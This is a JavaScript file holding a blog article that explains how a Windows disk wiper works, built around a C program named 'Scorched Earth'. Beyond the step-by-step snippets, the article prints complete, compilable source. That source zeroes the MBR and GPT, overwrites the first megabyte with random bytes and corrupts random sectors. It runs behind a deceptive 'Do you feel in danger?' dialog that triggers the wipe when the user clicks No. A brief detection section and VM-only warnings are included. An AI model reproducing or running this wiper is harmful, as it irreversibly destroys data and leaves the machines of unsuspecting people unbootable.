// Scorched Earth: Building an Educational Disk Wiper in C
const diskWiperArticle = {
    title: 'Scorched Earth: How Disk Wipers Actually Work (Low-Level Windows Edition)',
    date: 'April 14, 2025',
    readTime: '20 min read',
    tag: 'Malware Analysis',
    difficulty: 'Intermediate',
    content: `
        <div class="article-header">
            <h1>Scorched Earth: How Disk Wipers Actually Work :D</h1>
            <p class="article-meta">A look at low-level Windows disk I/O and the mechanics behind destructive malware — for learning purposes obviously</p>
        </div>

        <div class="warning-box" style="background:#fce7f3;border-left:4px solid #ec4899;padding:1.2rem 1.5rem;border-radius:8px;margin:1.5rem 0;">
            <strong>⚠️ Hey, read this first!</strong><br>
            This is strictly educational. Don't run this on anything you care about — seriously, ONLY in an isolated VM.
            This thing will destroy data, nuke boot structures, and render a machine completely unbootable.
            You've been warned :)
        </div>

        <h3>What You'll Learn</h3>
        <ul>
            <li>How Windows handles raw physical disk access at the API level</li>
            <li>What the MBR and GPT are and why wiping them is so destructive</li>
            <li>How <code>CreateFileW</code>, <code>WriteFile</code>, and <code>DeviceIoControl</code> interact with disk hardware</li>
            <li>Why the first 1MB of a disk is so critical</li>
            <li>How real-world wiper malware causes irreversible damage — and how to detect it</li>
        </ul>

        <h2>So... Why Build a Disk Wiper? :D</h2>

        <p>
            One of the best ways to understand how destructive malware works is to actually build one — in a safe, isolated environment.
            Wiper malware (think NotPetya, Shamoon, WhisperGate) is one of the most devastating classes of attacks out there.
            Unlike ransomware that encrypts and demands money, wipers just... destroy. No negotiation, no recovery.
        </p>

        <p>
            This project — "Scorched Earth" — is a proof-of-concept wiper written in C that I built to understand exactly
            how user-mode applications can reach all the way down to your physical disk sectors. It's a really eye-opening rabbit hole
            into Windows internals and the Win32 API. Let's break it down step by step.
        </p>

        <h2>Step 1 — Getting Raw Disk Access</h2>

        <p>
            The interesting thing about Windows is that you can access physical disks directly — bypassing the file system entirely —
            just by using <code>CreateFileW</code> with a special device path:
        </p>

        <pre><code>HANDLE hDisk = CreateFileW(
    L"\\\\.\\PhysicalDrive0",   // The primary hard disk
    GENERIC_READ | GENERIC_WRITE,
    FILE_SHARE_READ | FILE_SHARE_WRITE,
    NULL,
    OPEN_EXISTING,
    0,
    NULL
);</code></pre>

        <p>
            <code>\\\\.\\PhysicalDrive0</code> is a device path that points to the first physical disk on the machine —
            the one that usually holds your OS, bootmgr, everything. When you open a handle to this, you're talking directly to
            raw physical sectors, completely bypassing NTFS or any other file system. No file system rules, no permissions checks at that level.
        </p>

        <p>
            The catch? Windows won't let just anyone do this. It <strong>strictly requires Administrator (elevated) privileges</strong>,
            which is why real-world wipers always try to escalate privileges first or get delivered via exploits.
        </p>

        <h2>Step 2 — Obliterating the Boot Structures (MBR & GPT)</h2>

        <p>
            Before you can navigate to a specific byte offset on a disk, you use <code>SetFilePointerEx</code>.
            Think of it like <code>fseek</code> but for raw hardware. The first target? The boot structures.
        </p>

        <h3>What's the MBR?</h3>
        <p>
            The Master Boot Record lives in the very first 512 bytes of the disk (Sector 0). It contains:
        </p>
        <ul>
            <li>Legacy bootcode (the tiny program that starts your OS loader)</li>
            <li>The partition table for MBR-based disks (up to 4 primary partitions)</li>
            <li>The magic signature <code>0x55AA</code> at bytes 510–511</li>
        </ul>

        <p>Wipe this with zeros, and a legacy system has literally no idea how to boot.</p>

        <h3>What's the GPT?</h3>
        <p>
            Modern systems use UEFI and the <strong>GUID Partition Table</strong> instead. The GPT header sits at Sector 1,
            and the partition entries array occupies Sectors 2–33. There's also a backup GPT copy at the very end of the disk.
        </p>
        <p>
            The wiper hits both — primary GPT header and the full partition table array. Once those are gone,
            the OS can no longer determine the boundaries, offsets, or types of any partition on the disk. :')
        </p>

        <pre><code>// Navigate to Sector 0 (MBR)
LARGE_INTEGER offset = { 0 };
SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);
WriteFile(hDisk, zeros, 512, &bytesWritten, NULL);

// Navigate to Sector 1 (GPT Header)
offset.QuadPart = 512;
SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);
WriteFile(hDisk, zeros, 512 * 33, &bytesWritten, NULL);</code></pre>

        <h2>Step 3 — The First Megabyte "Nuke"</h2>

        <p>
            After killing the partition structures, the wiper iterates through the first <strong>1 Megabyte</strong> of the disk
            in 4KB chunks, writing completely random bytes:
        </p>

        <pre><code>for (int i = 0; i < 256; i++) {
    // Generate random 4KB of garbage
    for (int j = 0; j < 4096; j++)
        buffer[j] = (BYTE)(rand() % 256);

    offset.QuadPart = i * 4096;
    SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);
    WriteFile(hDisk, buffer, 4096, &bytesWritten, NULL);
}</code></pre>

        <p>
            Why the first 1MB specifically? Because that's where everything critical lives:
        </p>
        <ul>
            <li>Bootloader stages (like GRUB stage 1.5, or Windows Boot Manager's early code)</li>
            <li>The NTFS Volume Boot Record — the thing that tells the OS where the file system starts</li>
            <li>EFI System Partition metadata</li>
        </ul>
        <p>
            Once this is randomized with garbage data, bootstrap execution is completely impossible.
            Even if you could somehow find the partition, you couldn't start the OS. :D
        </p>

        <h2>Step 4 — Talking to the Kernel with DeviceIoControl</h2>

        <p>
            To scatter damage across the entire disk (not just the first MB), the wiper first needs to know the disk's
            total size. It does this by sending an IOCTL directly to the disk driver:
        </p>

        <pre><code>DISK_GEOMETRY_EX diskGeometry;
DeviceIoControl(
    hDisk,
    IOCTL_DISK_GET_DRIVE_GEOMETRY_EX,
    NULL, 0,
    &diskGeometry, sizeof(diskGeometry),
    &bytesReturned,
    NULL
);</code></pre>

        <p>
            This is a really cool example of <strong>user-to-kernel communication</strong>. Your user-mode app sends an
            I/O Control code (IOCTL) down to the <em>kernel-mode</em> storage driver, which replies with the disk's physical
            specs — sector size, total number of sectors, disk size in bytes. It works consistently across different hardware
            because it's talking to the driver abstraction layer, not the hardware directly.
        </p>

        <h2>Step 5 — Scattered Sector Corruption</h2>

        <p>
            Using the total sector count from the IOCTL, the wiper calculates 100 random sector offsets spread across the disk
            and overwrites each with random garbage:
        </p>

        <pre><code>LONGLONG totalSectors = diskGeometry.DiskSize.QuadPart / 512;

for (int i = 0; i < 100; i++) {
    LONGLONG randomSector = (LONGLONG)rand() % totalSectors;
    offset.QuadPart = randomSector * 512;
    SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);
    WriteFile(hDisk, randomBuffer, 512, &bytesWritten, NULL);
}</code></pre>

        <p>
            This is particularly nasty from a forensics perspective. Depending on where those random sectors land, you might hit:
        </p>
        <ul>
            <li>The NTFS Master File Table (MFT) — the index of every file on the partition</li>
            <li>Critical Windows Registry hives stored on disk</li>
            <li>User data files</li>
            <li>Pagefile or hibernation data</li>
        </ul>
        <p>
            Sporadic corruption across random sectors makes data recovery incredibly difficult — even professional forensic tools
            struggle when you can't trust the disk's metadata structures at all.
        </p>

        <h2>The Key Win32 APIs — Quick Reference</h2>

        <p>Here's a summary of the APIs this project uses and what they actually do:</p>

        <ul>
            <li><strong><code>CreateFileW</code></strong> — Opens a handle to a raw device (<code>\\\\.\\PhysicalDrive0</code>), bypassing the file system entirely</li>
            <li><strong><code>SetFilePointerEx</code></strong> — Moves to an exact byte offset on the physical disk (i.e., navigates to a specific sector)</li>
            <li><strong><code>WriteFile</code></strong> — Writes your payload (zeros or random bytes) directly to the physical sectors</li>
            <li><strong><code>DeviceIoControl</code></strong> — Sends IOCTL commands to the kernel-mode disk driver to query hardware-level information</li>
        </ul>

        <h2>Building It</h2>

        <p>
            The code is standard C with the Win32 API — no exotic dependencies needed.
            Compile with GCC/MinGW:
        </p>

        <pre><code>gcc merged_game.c -o ScorchedEarth.exe</code></pre>

        <p>
            You <strong>must</strong> run the compiled binary as Administrator for the disk access to work.
            If you're testing this (in a VM, please!), right-click → Run as Administrator.
        </p>

        <h2>A Note on Hardware Variances :)</h2>

        <p>
            Different OEM vendors (HP, Dell, Acer, Lenovo...) configure Windows slightly differently out of the box.
            Some have stricter default security policies, OEM-specific endpoint agents, or custom execution settings.
            So behavior on a Dell VM might differ from an Acer VM — particularly around privilege checks and execution policies.
        </p>
        <p>
            If you're testing delivery mechanisms (batch scripts, etc.) alongside this, expect interference from Windows Defender
            and other built-in defenses. The code itself has no evasion capabilities — it's a pure proof-of-concept.
            Getting caught by AV is expected and honestly kind of the point :D
        </p>

        <h2>Detection — How Would You Catch This?</h2>

        <p>
            Since this whole thing is for learning, let's flip it around — how would a defender detect this kind of activity?
        </p>

        <ul>
            <li><strong>Raw disk handle creation</strong> — <code>CreateFile</code> calls to <code>\\\\.\\PhysicalDriveX</code> paths are highly suspicious from user-mode processes. Windows ETW (Event Tracing for Windows) can surface these.</li>
            <li><strong>Volume shadow copy deletion</strong> — Real wipers often delete VSS snapshots first. Event ID 524 or PowerShell <code>vssadmin delete shadows</code> is a red flag.</li>
            <li><strong>Privilege escalation chains</strong> — Watch for token impersonation, UAC bypasses, or processes spawning with SeBackupPrivilege/SeRestorePrivilege.</li>
            <li><strong>High-frequency write I/O to disk</strong> — Sudden spikes in disk write operations, especially sequential writes starting at offset 0, are anomalous.</li>
            <li><strong>IOCTL_DISK_GET_DRIVE_GEOMETRY_EX from user processes</strong> — Legitimate applications rarely need to query raw disk geometry.</li>
        </ul>

        <h2>The Source Code — If You Want to See :D</h2>

        <div class="warning-box" style="background:#fce7f3;border-left:4px solid #ec4899;padding:1.2rem 1.5rem;border-radius:8px;margin:1.5rem 0;">
            <strong>⚠️ Hey! Code can be dangerous.</strong><br>
            You're about to look at working wiper code. Seriously — <strong>VM only</strong>, isolated, snapshots on.
            Don't be that person who runs it on their host. Have fun tho :D
        </div>

        <p>
            For those who want to see what this actually looks like under the hood — here's the full source.
            Read through it with the writeup above and it should all click :)
        </p>

        <pre><code>#include &lt;windows.h&gt;
#include &lt;winioctl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;time.h&gt;
#include &lt;string.h&gt;

// Forward declaration
void ExecuteScorchedEarth();

int main() {
    // Show ASCII art intro
    system("cls");
    printf("\\n\\n\\n");
    printf("          ██████╗  █████╗ ███╗   ██╗ ██████╗ ███████╗██████╗ \\n");
    printf("          ██╔══██╗██╔══██╗████╗  ██║██╔════╝ ██╔════╝██╔══██╗\\n");
    printf("          ██║  ██║███████║██╔██╗ ██║██║  ███╗█████╗  ██████╔╝\\n");
    printf("          ██║  ██║██╔══██║██║╚██╗██║██║   ██║██╔══╝  ██╔══██╗\\n");
    printf("          ██████╔╝██║  ██║██║ ╚████║╚██████╔╝███████╗██║  ██║\\n");
    printf("          ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝\\n");
    printf("\\n\\n");
    Sleep(1500);

    // Main question - simple and direct
    int response = MessageBoxW(NULL,
        L"⚠️  Do you feel in danger?  ⚠️\\n\\n"
        L"Choose carefully...",
        L"Question",
        MB_YESNO | MB_ICONQUESTION | MB_SYSTEMMODAL);

    if (response == IDNO) {
        // They clicked NO - execute the payload
        MessageBoxW(NULL,
            L"There is no turning back...",
            L"tell your disk a nice goodbye",
            MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL);

        // Execute the disk wiper
        ExecuteScorchedEarth();

        MessageBoxW(NULL,
            L" SCORCHED EARTH \\n\\n"
            L"The deed is done.\\n"
            L"System will not boot again, nor the system will see the light of a day.",
            L"Mission Accomplished",
            MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);

    } else {
        // They clicked YES (feel in danger)
        MessageBoxW(NULL,
            L"✅ Smart choice.\\n\\n"
            L"You have been spared.\\n"
            L"Stay safe out there.",
            L"Wise Decision",
            MB_OK | MB_ICONINFORMATION);
    }

    return 0;
}

void ExecuteScorchedEarth() {
    printf("\\n Have a lovely afternoon \\n");

    HANDLE hDisk = CreateFileW(L"\\\\\\\\.\\\\PhysicalDrive0",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING,
        FILE_FLAG_WRITE_THROUGH, NULL);

    if (hDisk == INVALID_HANDLE_VALUE) {
        printf("Failed to run the code. Need admin rights.\\n");
        MessageBoxW(NULL,
            L" ERROR: Administrator privileges required\\n\\n"
            L"Run as Administrator to execute.",
            L"Access Denied",
            MB_OK | MB_ICONERROR);
        return;
    }

    BYTE pattern[4096];
    DWORD written;
    LARGE_INTEGER offset;

    srand(time(NULL));

    // 0. Destroy MBR and GPT headers (both BIOS and UEFI)
    printf("[*] Destroying your confidence...\\n");

    // Wipe MBR (sector 0)
    offset.QuadPart = 0;
    SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);
    memset(pattern, 0, 512);
    WriteFile(hDisk, pattern, 512, &amp;written, NULL);

    // Wipe primary GPT header (sector 1)
    offset.QuadPart = 512;
    SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);
    WriteFile(hDisk, pattern, 512, &amp;written, NULL);

    // Wipe GPT partition table (sectors 2-33)
    for (int i = 0; i &lt; 32; i++) {
        WriteFile(hDisk, pattern, 512, &amp;written, NULL);
    }

    printf("[*] confidence destroyed!\\n");

    // 1. Nuke first 1MB (all boot structures)
    printf("[*] Obliterating ego...\\n");
    offset.QuadPart = 0;
    SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);

    for (int i = 0; i &lt; 256; i++) {  // 256 * 4KB = 1MB
        for (int j = 0; j &lt; 4096; j++) {
            pattern[j] = (BYTE)(rand() &amp; 0xFF);
        }
        WriteFile(hDisk, pattern, 4096, &amp;written, NULL);
        if (i % 64 == 0) printf("  booM...\\n", i * 4);
    }

    // 2. Get disk size via IOCTL
    DISK_GEOMETRY_EX diskGeo;
    DWORD bytesReturned;
    LONGLONG totalSectors = 0;

    if (DeviceIoControl(hDisk, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX,
                        NULL, 0, &amp;diskGeo, sizeof(diskGeo),
                        &amp;bytesReturned, NULL)) {
        totalSectors = diskGeo.DiskSize.QuadPart / 512;
        printf("[*] Disk size: %lld bytes (%lld sectors)\\n",
               diskGeo.DiskSize.QuadPart, totalSectors);
    } else {
        totalSectors = 209715200LL; // 100GB fallback
        printf("[*] Could not get disk size, using 100GB default\\n");
    }

    if (totalSectors &lt;= 1000) {
        totalSectors = 209715200LL;
        printf("[!] Invalid sector count, using default\\n");
    }

    // 3. Destroy 100 random sectors throughout the disk
    printf("[*] Destroying you where you have wronged others and failed to acknowledge...\\n");
    for (int i = 0; i &lt; 100; i++) {
        LONGLONG randomSector = ((LONGLONG)rand() * (LONGLONG)rand()) % (totalSectors - 1000);
        if (randomSector &lt; 2048) randomSector = 2048;

        offset.QuadPart = randomSector * 512;
        SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);

        for (int j = 0; j &lt; 512; j++) {
            pattern[j] = (BYTE)(rand() &amp; 0xFF);
        }

        WriteFile(hDisk, pattern, 512, &amp;written, NULL);

        if (i % 20 == 0) printf("  %d shatters*...\\n", i);
    }

    FlushFileBuffers(hDisk);
    CloseHandle(hDisk);

    printf("\\n MAY your soul betray your becoming!\\n");
}</code></pre>

        <h2>Wrapping Up</h2>

        <p>
            This project taught me a ton about how Windows abstracts hardware access and how thin the line really is between
            "user-mode application" and "raw hardware interaction" when you have the right privileges.
            The Win32 API is incredibly powerful in a way that's easy to underestimate.
        </p>

        <p>
            The scariest thing? This code is maybe 150 lines of C. Real wiper malware (NotPetya, Shamoon) is obviously far more
            sophisticated — better evasion, propagation mechanisms, targeting logic. But the <em>core destructive primitive</em>
            is exactly what you see here: raw disk I/O via Windows device handles. That's it.
        </p>

        <p>
            So next time you hear about a wiper attack in the news, you'll know exactly what's happening under the hood :D
        </p>

        <div class="conclusion-quote">
            <blockquote>
                "The best way to learn how something breaks is to break it yourself — safely."
                <footer>— me, justifying this project to myself :D</footer>
            </blockquote>
        </div>
    `
};

if (typeof window !== 'undefined') {
    if (!window.comprehensiveArticles) window.comprehensiveArticles = {};
    window.comprehensiveArticles['disk-wiper'] = diskWiperArticle;
}

if (typeof module !== 'undefined' && module.exports) {
    module.exports = diskWiperArticle;
}
